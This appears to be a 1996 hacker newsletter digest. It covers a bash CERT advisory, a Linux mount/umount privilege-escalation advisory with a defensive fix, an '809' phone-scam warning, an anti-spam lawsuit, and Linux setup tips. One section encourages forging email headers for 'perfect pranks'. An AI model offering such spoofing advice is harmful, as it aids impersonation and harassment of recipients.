Subject: CERT Advisory CA-96.22 - Vulnerabilities in bash

This advisory on the bash shell is important to linux users as bash is the preferred linux shell.

Note tht this advisory merely warns that there is a way for bash to be used to execute "arbitrary commands." It doesn't, however, report any specific dastardly deeds known to have been done using bash.

We should presume that some uberhacker types are working right now to turn this bug into interesting exploits. -- CM

> 
>         There is a variable declaration error in the "yy_string_get()"

> 
>         The "string" variable is used to traverse the character string 
>         containing the command line to be parsed. As characters are 
>         retrieved from this pointer, they are stored in a variable of type

 It depends on how you read your email. Some programs have pretty wimpy 
 headers, stripping out lots of useful things. An example is the free version 
 of Eudora. Other email programs have really, really good headers. The best I 
 have found is Elm, which runs under Unix. 
  
 Before you assume you have found a host that lets you forge really, really 
 good email, I would suggest checking the headers under Elm. 
  
 Even then, if you have what looks like perfectly forged headers, watch out 
 for using it in a way that might defraud or harass someone. There is no such 
 thing as the "perfect" crime. But there can certainly be "perfect" pranks. 
  
 The next time someone sends in a "Good Times" virus alert to a hacker list, 
 he or she had darn better use a perfect email forgery scheme! -- CM

         CONCENTRIC NETWORK OBTAINS JUDICIAL RELIEF AGAINST SPAMMER

    CUPERTINO. Calif., (October 9, 1996)-- Concentric Network Corporation, 
a leading provider of tailored network solutions for the rapidly growing 
electronic commerce and Internet/intranet markets, today announced that 
Cyber Promotions, Inc. and its president Sanford Wallace have been ordered 
by a federal judge to swear, under penalty of perjury, that they will cease 
engaging in conduct which causes the overload of Concentric's mail system 
and the denial of mail service to Concentric Networks' subscribers.

   In a lawsuit filed against Cyber Promotions and Wallace on October 2, 
1996, seeking an injunction, compensatory and punitive damages, Concentric 
alleges that the Defendants send unsolicited electronic advertisements, or 
"spam," to hundreds of thousands of Internet users on a daily basis and 
falsely designate a Concentric Network account as the point of origin of 
those messages.  According to the suit, this causes tens of thousands of 
undeliverable messages to be routed back into Concentric Network's mail 
system for processing and storage, resulting in the overload of Concentric's 
equipment and the denial of service to its subscribers.

    On Monday, October 7, a federal judge in the Northern District of 
California ordered Wallace and Cyber Promotions to submit an affidavit to 
the Court swearing under oath that they would not engage in such conduct in 
the future.  In the sworn affidavit filed Tuesday, Wallace and Cyber 
Promotions stated:

    "[W]e will not continue to use accounts that have been opened with 
Concentric to send or receive e-mail or in connection with the sending or 
receiving or e-mail.  Moreover, [we] will not open up any new accounts with 
Concentric or have anyone on our behalf open an account with Concentric for 
the purpose of sending or receiving of e-mail or in connection with the 
sending or receiving of e-mail."

  "We are extremely pleased with the Court's ruling, and the protection we 
have been able to secure for our subscribers," said Henry R. Nothhaft, 
Concentric's president and CEO.  "This practice interferes with subscriber's 
ability to effectively use our network. They have asked us to stop it.  We 
will continue to take steps to protect our customers from this type of 
conduct."

    Concentric's suit alleges that by causing the denial of service to 
Concentric's subscribers, the Defendants have acted in violation of the 
Computer Fraud and Abuse Act and the Electronic Communications Privacy Act. 
Concentric also claims that by falsely representing that the junk e-mail 
messages originate from a Concentric account, Defendants have implied that 
Concentric supports or condones Cyber Promotions' business practices.  In 
fact, Concentric's Terms of Service Agreement expressly prohibits the act of 
spamming.  Concentric encourages their customers to inform the Company of 
any further spamming episodes.

For complete text of the affidavit refer to Concentric Network's web 
site at http://www.concentric.net.

Try again with forged email. When I forge email and read it with 
different email programs I get different results.

I put a bunch of junk in the header of this one. Try reading it first 
with elm, then pine, then download it to your PC with Eudora Lite. See if 
you get any differences.

I email stuff to myself from one of my ISPs to another as another way of 
checking what gets stripped off.

More On The "809" SCAM: Internet ScamBusters Uncovers 
Additional Serious Implications For The Infamous "809" Scam 
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++=3D

On Monday we sent out a Special Alert to notify subscribers of the 
"809" Scam.  We've been doing a lot of research on this scam all 
week, and getting *a lot* of email.  Last night we uncovered 
information which results in much broader implications of this scam 
than we've seen reported anywhere.  So, we're sending out this 
additional issue of Internet ScamBusters to warn you about the new 
developments.

Brief review: The "809" scam has many permutations but they all 
involve a message to you (either by email, phone or pager) that you 
immediately call a number in the "809" area code to avoid some bad 
consequence (such as litigation, or to receive information about 
someone who has been arrested or died) or to gain some good benefit 
(such as winning a wonderful prize).

The "809" area code is in the Caribbean, yet most people are not 
aware that they are making an international call when they dial the 
"809" area code.  "809" calls can be "pay-per-call" numbers (such as 
900 numbers in the US) - and there are no legal requirements that 
callers be informed that they are being charged extra.  When you 
return a "pay-per-call" 809 call, they try to keep you on the phone 
as long as possible, and you are charged very high rates for the 
call, reportedly up to $25 per minute.

New information:  Until recently, the "809" area code covered the 
entire Caribbean.  However, that's changed.  There are now a series 
of new area codes for different countries in the Caribbean.  That 
means there are now additional area codes which victims can 
unknowingly call with the same results as the original "809" scam. 
The "268" area code is already reportedly being used by scam artists. 
  And you can be sure that the scammers won't take long to start 
using these new codes in a big way.

According to representatives at AT&T, here are the new area codes and 
their effective dates: 
Country         Code      Effective Date 
Bahamas         242       October 1, 1996 
Barbados        246       July 1, 1996 
Antigua         268       April 1, 1996 
Cayman Islands  345       September 1, 1996 
Monsterrat      664       July 1, 1996 
St. Lucia       758       July 1, 1996 
Puerto Rico     787       March 1, 1996 
St. Kitts/Nevis 869       October 1, 1996 
Jamaica         876       October 1, 1996 (conflicting reports- 
                          may still be 809)

Bermuda now has the area code of 441.

A few more countries will be changing their area codes in 1997: 
N. Commonwealth 
of Mariana Is.  670       July 1, 1997 
Trinidad & 
Dominica        767       October 1, 1997 
Tobago          868       June 1, 1997 (however, this may have 
                          already have occurred according to AT&T)

Several countries are keeping the 809 area code, such as the 
Dominican Republic, Grenada, Virgin Islands, Martinique, St. John 
(although St. John may change to 268), St. Thomas, and St. Vincent.

(Please note: We spoke with three representatives at AT&T, and they 
all gave us slightly different information. For example, they varied 
on whether the effective date for Antigua's change was March 1 or 
April 1, 1996 and whether Jamaica has a new area code.  However, our 
concern is with the major concepts rather than with the specific 
details.)

And there's more.  AT&T supplied us with a long list of 
"pay-per-call" numbers.  The numbers on this list may include adult 
sex lines, resume lines, and other "pay-per-call" numbers.

(Please note: this list does not include all of the "pay-per-call" 
numbers in the Caribbean - and there may be numbers included below 
that are not "pay-per-call" numbers.  Our purpose here is to warn 
readers of the scope of this problem.)

Summary: Be very careful returning phone numbers to area codes you 
don't recognize, especially when you receive calls, emails or pages 
with urgent messages that you call these numbers.  Call your long 
distance phone company's operator to find out where the area code is 
located (or look it up on the net), and only call numbers that make 
sense to you.

Two additional "pay-per-call" number scams:

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++=3D+ 
SCAM: Some 800 numbers reportedly roll over to "809" and other 
foreign "pay-per-call" numbers with little or no warning. 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

A representative at AT&T warned us of a common scam she encounters. 
Here's how it works:  You see an ad on the Internet or in a newspaper 
for an overseas job opportunity as a "secret shopper" or a "mystery 
shopper." You call the listed 800 number to either learn more or to 
apply for the job.  You are left on hold for 15 to 20 minutes.  You 
are either warned that the call is being rolled over to a toll call, 
or you're not warned. However, even when people are warned, they 
don't realize that the roll over is to an international, 
"pay-per-call" number.  When you are finally connected, you're told 
all the positions have been filled.  When you receive your phone 
bill, you have a very large charge.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ 
SCAM: "809" and other "pay-per-call" numbers can be used to cheat 
businesses who offer fax back services. 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Thanks to Lee Jones, who alerted us to this scam: Many companies 
offer a computerized fax-back service where the company faxes 
requested documents to a phone number entered by the caller.  The 
caller can get the fax-back service to call back their "pay-per-call" 
number.  When the business calls this "pay-per-call" fax number to 
send the documents, they are charged the very inflated rates.  You 
should consider protecting your business from this scam by blocking 
area codes such as those listed above.

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

An update on the Internet version on the 809 scam we described in the 
last issue of Internet ScamBusters:

On October 8th, we looked up the domain name and ISP of "Global 
Communications," the company that had posted the "809" message we 
included in the last issue. We discovered that the domain name, 
demon.net, is owned by Demon Systems Limited, in London.  We tried 
calling Demon many times, but their phone was always busy.  We 
emailed them asking what they intended to do about this scam, but we 
received no reply (other than their automated response that they had 
received our email).

We also searched the newsgroups to see whether they had posted any 
additional information.  We found three relevant posts. Here is part 
of the response from Mike Whitaker, Duty Postmaster, Demon Internet 
Ltd., postmaster@demon.net:

---------------------------------------------------------- 
This message originates from one of our customers and is clearly a 
'scam' to persuade people to call the number listed. Demon take a 
very dim view of such behaviour, and appropriate action is being 
taken. 
----------------------------------------------------------

Demon Internet has closed "Global Communications" account and is 
considering further action.

You can be sure that "Global Communications" and other companies like 
them will be back soon with different names, phone numbers, email 
addresses and messages.  Again, it's not the specifics of this scam 
that are important - it's watching out for the general principles.

Incidentally, if you're curious, several people called the 809 phone 
number "Global Communications" posted to discover what actually 
happened when you called.  Ryan J. Donmoyer, in MONEY Daily on 
October 9th, reports:

"Callers to the number are led to believe they are talking to 
a live person, but in fact it is a clever recording that 
responds to the caller's voice. Among other things, an 
irate-sounding man with a British accent warns, 'Your 
check will come round or we'll come round to get it.' The 
recording seems designed to keep callers on the line as 
long as possible, and is reportedly billed at $25 per minute."

Others reported that this "man" with a British accent kept telling 
them to hold on while he picked up other phone calls and supposedly 
yelled at his staff. He continued to yell at the callers as well, 
saying "send the money," and yelled into other ringing phones as long 
as the callers remained on the line. 
 

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Corrections and Clarifications to Issue #8 Of Internet ScamBusters:

- According to our sources at AT&T, the number listed in the email 
(809 496 2700) is located in the Dominican Republic, not in the 
British Virgin Islands or the Bahamas as we reported.

- We had a typo in the last issue that implied that the Bahamas and 
the British Virgin Islands were the same country - obviously, that's 
not true. (Thanks to Kathryn Morris for pointing this out.)

- Finally, we hope it goes without saying that we do not view all 
Caribbean businesses as fraudulent.  Obviously, most Caribbean 
businesses are honest.  Nor did we name the West Indian language as 
"broken English."  What we said was the person who answers the phone 
in these scams sometimes speaks broken English and pretends not to 
understand you to keep you on the line.  We certainly did not, and do 
not, view West Indian language as "broken English."

From: Greg Bulmash <gbhp@worldnet.att.net>

An addendum you may want to note.  ANYONE wishing to use graphics 
above 320x200 REALLY needs to make sure their video card is supported 
in the svgalib that they get.

MANY mix & match computer makers (store systems, not name-brands) 
are using the Trident TGUI 9440 or higher chipset.  This is not 
presently supported.  There is a beta version of Xfree86 that 
supports it, but it's a full release with an expiration date 
(because it's beta and they want to force you to upgrade), so you'll 
have to download it again in 60 days anyway.  According to their 
FAQ, the actual "release" with the Trident support will be available 
sometime before the end of the year.

So, if you're going to install Linux and have a Trident 9440 video 
board, you may want to wait until January or later to buy your 
CD-ROM.  You'll have a better chance of getting your card supported 
and you'll also probably get a newer kernel release so it'll save you 
that much hassle in upgrading later on.

Another suggestion is to READ comp.os.linux.setup BEFORE you attempt 
to do an install!  If you do this, you can often catch people 
expressing problems with hardware or installation conflicts you may 
end up encountering.  I had a fairly smooth install, because I did 
some pre-install troubleshooting.

I can't use X-windows, FVWM, or any of the fun graphics stuff yet, 
though.

Agreed if you're going to run X-Windows, but in the meantime, why not go 
ahead and do the preliminary Linux install, and just install the card 
support update later by downloading it from the 'net?  While you're waiting 
for the update to config X-Win, you could be exploring Linux for at least a 
couple of months, utilizing its communication capabilities and more.   :)

Also, there is a book being released this month:  Linux in a Nutshell, by

Note that Linux is normally a full-fledged 32-bit operating system, and, 
hence, requires a 386 or higher processor.  The 286 isn't 32-bit.  However, 
there is a distribution of Linux in development (the name eludes me 
currently, might be Linux86 or something) which will run on the z80, 8088, 
8086, and 286.  I don't think that there is a working, distributed version 
of this available yet, though.

One thing to keep in mind is that most vulnerabilities in Linux and other 
Unix operating systems are not due to inherent flaws in the system but 
rather due to misconfigurations on the part of the system adminstrator. 
However, it is true that there are a few flaws in Linux itself. 
Fortunately, shortly after any flaw is made public, a patch invariably 
shows up. (-:

On a side note, if anyone has a Windows machine and a Linux machine on an 
ethernet, there is a program called SAMBA and a filesystem called ksmbfs 
that will allow your windows computer to mount shares on the linux machine, 
and vice-versa, respectively.

send them anymore, but the first time.  Each one carries a minimum 
penalty of $500 and a maximum penalty of $1500.

Okay,

I knew it was full distribution, but I had no idea that it had an 
expiration date.  Bum deal!  Greg is right - the patch would be better to 
wait for, because then you can install the base Linux system, and learn a 
little about it (and you can learn a *lot* in two month's time if you are 
up to it) in the meantime.

Thanks for the info on the expiration, Greg!  I'll be passing that on to a 
few people who don't know that already.  :)

ABSTRACT

  
        This update fixes several URLs of the Linux Security FAQ Update#13 
        "mount/umount vulnerability" dated Tue Sep Wed Oct 23 20:09:59 EDT 
        1996. There are no major updates to the text of the document. 
  
        A vulnerability exists in the mount/umount programs of the 
        util-linux 2.5 package. If installed suid-to-root, these programs 
        allow local users to gain super-user privileges.

RISK ASSESSMENT

        Local users can gain root privileges. The exploits that exercise 
        this vulnerability were made available.

VULNERABILITY ANALYSIS

        mount/umount utilities from the util-linux 2.5 suffer from the 
        buffer overrun problem. Installing mount/umount as suid-to-root 
        programs is necessary to allow local users to mount and unmount 
        removable media without having super-user privileges. If this 
        feature is not required, it is recommended that suid bit is removed 
        from both mount and umount programs. If this feature is required, 
        one might want to consider the other ways of implementing it. Such 
        approaches include but are not limited to using auto-mounter or sudo 
        mechanism.

DISTRIBUTION FIXES

                Red Hat Commercial Linux

                        RedHat 2.1, RedHat 3.0.3 (Picasso) and RedHat 3.0.4 
                        (Rembrandt) contain vulnerable umount utilities.

                        Red Hat Software advises users of Red Hat 2.1 to 
                        upgrade to Red Hat 3.0.3 (Picasso)

                        It is believed at this moment that all Linux 
                        distributions using util-linux version 2.5 or prior 
                        to that contain the vulnerable mount and umount 
                        programs.

                        Administrators of systems based on distributions 
                        not listed in this LSF Update or distributions that 
                        do not have fix-kits available at the moment are 
                        urged to contact their support centers requesting 
                        the fix-kits to be made available to them.

                        In order to prevent the vulnerability from being 
                        exploited in the mean time, it is recommended that 
                        the suid bit is removed from mount and umount 
                        programs using command

                                chmod u-s /bin/mount /bin/umount

                        Until the official fix-kits are available for those 
                        systems, it is advised that system administrators 
                        obtain the source code of fixed mount program used 
                        in Debian/GNU Linux 1.1, compile it and replace the 
                        vulnerable binaries.

                        The URLs for the source code of the Debian/GNU Linux 
                        1.1 package which fixes the security problem of 
                        mount utility can be obtained from the following 
                        URLs:

Question: Why even make the pretense that this is 'mostly harmless'? This 
is a DOS attack, pure and simple.

Gee. Linux likes to put it in /bin/ping (for newer distributions at 
least). Urging people to complain because they can't find a util seems 
pointless. How about telling them "whereis" or the more useful "find" 
command?

Is this another "harmless" hack?

How in the hell can you justify recommending this under any 
circumstances?! I think that is just about the farthest from 'hacking' 
that one can get. 
 

I understand what you are doing, and why.. but I'd like to point out the 
hypocrisy of it. It is more than obvious you don't want to get busted or 
harassed because of this, but please don't make pretenses about "harmless" 
hacking and post stuff like this. There is nothing wrong or illegal with 
saying "this will harm a system". Hell, you said as much already.. don't 
contradict yourself with this other babble of it being 'alright' or 
whatever.

From: Greg Bulmash <gbhp@worldnet.att.net>

If you drop by the Xfree86 web site...

  http://www.xfree86.org

You can find out more about how to get the latest release.  Presently 
the mirrors don't seem to have it yet and, of course, you need to be 
lucky to not catch the xfree86.org FTP server already maxed out.  But 
if you have been waiting like I have, getting online sometime tonight 
and making the effort to get it might just be worth your while.

Subject: More on Xfree86 3.2

If anyone is trying to d-load it and they're finding that they can't 
get into ftp.xfree86.org, they may find that a number of the mirrors 
either don't have it or haven't made it available yet.  After a lot of 
searching, I found one that did...

ftp://despair.capecod.net/pub/XFree86/3.2/binaries/Linux

It is a full release, so expect to spend around an hour downloading 
all the components at 28.8.
